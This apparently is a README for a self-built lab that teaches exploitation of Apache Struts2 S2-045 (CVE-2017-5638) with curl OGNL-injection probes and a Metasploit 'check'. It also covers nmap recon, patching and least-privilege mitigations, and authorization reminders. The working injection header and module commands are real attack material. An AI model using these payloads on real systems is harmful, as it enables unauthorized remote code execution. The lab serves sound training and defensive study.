# Metasploit CVE lab: exploiting a real known vulnerability (Struts2 S2-045 / CVE-2017-5638)

A small, self-contained lab that demonstrates the **known-CVE exploitation** workflow — the
bread-and-butter of penetration testing — end to end, using **Metasploit**, the industry-standard
exploitation framework. It ships a real, historically-important vulnerable target (Apache Struts2,
the framework behind the 2017 Equifax breach) and walks from "what's running here?" to "I can run
commands as root."

Everything runs on your own machine against a target this lab builds — an authorized, legal
learning environment. Every command and block of output below is from a real run; the raw logs are
in [`output/`](output/).

---

## 0. Two ideas you need first: "CVE" and "exploitation framework"

- A **CVE** (Common Vulnerabilities and Exposures) is a public catalogue ID for one specific known
  vulnerability. This lab's target has **CVE-2017-5638** — a remote-code-execution flaw in Apache
  Struts2's file-upload (Jakarta Multipart) parser, publicly known as **S2-045**. A crafted
  `Content-Type` header is interpreted as an **OGNL expression** (a small language Struts evaluates)
  and executed on the server. It's the same class of bug that led to the 2017 Equifax breach
  (147M people).
- **Metasploit** is the standard open-source **exploitation framework**: a large library of
  ready-made exploit *modules* (one per known vulnerability) plus a runner that handles targeting,
  payloads, and the post-exploitation session. Instead of hand-writing an exploit, you pick the
  module for your CVE, point it at a target, and run it.

The lab shows the vulnerability **by hand first** (so the CVE isn't a black box), then **with
Metasploit** (so you see how the tool automates it).

---

## 1. The lab target

One service — a pinned-vulnerable **Apache Struts 2.3.30** build (from the well-known
[vulhub](https://github.com/vulhub/vulhub) project) — on host port **8280**.

```yaml
# docker-compose.yml
services:
  struts2:
    image: vulhub/struts2:2.3.30   # deliberately vulnerable to S2-045
    ports: ["8280:8080"]
```

---

## 2. Task 1 — Recon: what's running here?

Fingerprint the target with **nmap** ([`output/nmap_recon.txt`](output/nmap_recon.txt)):

```
$ nmap -sV -Pn -p 8280 localhost
PORT     STATE SERVICE VERSION
8280/tcp open  http    Jetty 9.2.11.v20150529
```

A Java web server (Jetty) hosting a Struts2 app. The next step in a real assessment is to identify
the Struts version and check it against known CVEs — which points straight at S2-045.

---

## 3. Task 2 — Prove the vulnerability by hand (so the CVE isn't magic)

S2-045 is triggered by putting an OGNL expression in the `Content-Type` header. Two probes,
both real output in [`output/manual_poc.txt`](output/manual_poc.txt):

**Probe 1 — prove the server evaluates our expression.** Ask it to compute `233*233` and put the
result in a response header:

```
$ curl -i -X POST http://localhost:8280/ \
    -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub-poc',233*233)}.multipart/form-data"

HTTP/1.1 200 OK
vulhub-poc: 54289            <- the server computed 233*233. It's executing our input.
```

**Probe 2 — real command execution.** The same injection point, with a longer OGNL payload that runs
a shell command and streams the output back:

```
$ curl -X POST http://localhost:8280/ -H "Content-Type: %{(#_='multipart/form-data')...(#cmd='id')...}"

uid=0(root) gid=0(root) groups=0(root)
```

That is remote code execution: an unauthenticated HTTP request just ran `id` on the server, **as
root**. (The full payload is in `output/manual_poc.txt`; it clears OGNL's sandbox, builds a
`ProcessBuilder`, runs the command, and copies its output to the HTTP response.)

---

## 4. Task 3 — The same thing with Metasploit

Metasploit ships a module for exactly this CVE: `exploit/multi/http/struts2_content_type_ognl`. The
workflow is: select the module → set the target → **check** (confirm it's vulnerable) → run.
A resource script is in [`exploit/struts2.rc`](exploit/struts2.rc); the run
([`output/msf_check.txt`](output/msf_check.txt)):

```
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 > set RHOSTS struts2-cve      # the target
msf6 > set RPORT 8080
msf6 > set TARGETURI /
msf6 > check
[+] 172.26.0.2:8080 - The target is vulnerable. Successfully executed the injected code

msf6 > info
       Name: Apache Struts Jakarta Multipart Parser OGNL Injection
  This module exploits a remote code execution vulnerability in Apache Struts
  https://nvd.nist.gov/vuln/detail/CVE-2017-5638
```

Metasploit's `check` independently confirms the CVE by actually executing injected code on the
target. From there, `run` with a payload (e.g. a command payload, or a reverse shell back to a
handler) delivers the exploit — the same RCE proven by hand in §3, but wired into Metasploit's
payload/session machinery. This lab stops at `check` + the by-hand RCE, because a reverse shell
needs a listener reachable from the target and adds moving parts without adding understanding.

**Why the two views matter:** the manual PoC shows you *what the vulnerability actually is* (an OGNL
expression in a header); Metasploit shows you *how the industry operationalizes it* — one module,
one `check`, repeatable across thousands of targets.

---

## 5. The defender's view (how this was fixed)

- **Patch.** S2-045 was fixed in Struts 2.3.32 / 2.5.10.1 (March 2017). The single most important
  control for known CVEs is **keeping software patched** — the Equifax breach happened because this
  exact patch wasn't applied in time.
- **Know your inventory + monitor CVEs.** You can't patch what you don't know you run; asset
  inventory + subscribing to vulnerability feeds (NVD, vendor advisories) is the precondition.
- **Virtual patching / WAF** can block the malicious `Content-Type` pattern as a stopgap before the
  real patch lands — a delay tactic, not a fix.
- **Least privilege.** The target here runs the app as **root**, which is why `id` returned root;
  running services as an unprivileged user limits the blast radius of an RCE.
- **CISA KEV.** CVE-2017-5638 is on CISA's Known Exploited Vulnerabilities catalogue — the
  authoritative "this is actually being exploited in the wild, patch it now" list.

---

## 6. Going deeper: authoritative resources

- **NVD — CVE-2017-5638**: https://nvd.nist.gov/vuln/detail/CVE-2017-5638 · **Apache S2-045 advisory**: https://cwiki.apache.org/confluence/display/WW/S2-045
- **CISA KEV catalogue**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- **Metasploit Unleashed** (free course by OffSec): https://www.offsec.com/metasploit-unleashed/ · **docs**: https://docs.metasploit.com/
- **vulhub** (the source of this target; dozens of reproducible CVE environments): https://github.com/vulhub/vulhub
- **TryHackMe — Metasploit** rooms / **HackTheBox** for guided practice: https://tryhackme.com · https://www.hackthebox.com

---

## 7. Reproduce it

Run these from this lab's own directory (the one containing this README):

```bash
# 0. isolated network (if it doesn't exist yet)
docker network create cyberlab 2>/dev/null || true

# 1. start the vulnerable target
docker compose up -d          # wait ~10s for Struts/Jetty to come up

# 2. Task 1 recon (needs nmap: `brew install nmap` / `apt install nmap`)
nmap -sV -Pn -p 8280 localhost

# 3. Task 2 prove RCE by hand (arithmetic proof)
curl -i -X POST http://localhost:8280/ \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub-poc',233*233)}.multipart/form-data" | grep vulhub-poc

# 4. Task 3 confirm with Metasploit (runs the framework in Docker, on the same network)
docker run --rm --network cyberlab metasploitframework/metasploit-framework \
  ./msfconsole -q -r /dev/stdin <<'EOF'
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS struts2-cve
set RPORT 8080
set TARGETURI /
check
exit
EOF

# 5. tear down
docker compose down
```

**Environment:** developed on macOS + Docker Desktop (arm64). Both the Struts2 target and the
Metasploit image are `linux/amd64` and run under emulation on Apple Silicon — functional, just
slower to start. Running Metasploit *inside* the `cyberlab` Docker network lets it reach the target
by name (`struts2-cve`) without publishing extra ports. The [`output/`](output/) directory holds the
real captured runs (`nmap_recon.txt`, `manual_poc.txt`, `msf_check.txt`).

**Boundary reminder:** Metasploit and these techniques may only be pointed at **a target you built
yourself** or an **authorized environment (a lab, or a client engagement with written permission)**.
Running them against systems you don't own or aren't authorized to test is a computer crime in
nearly every jurisdiction.
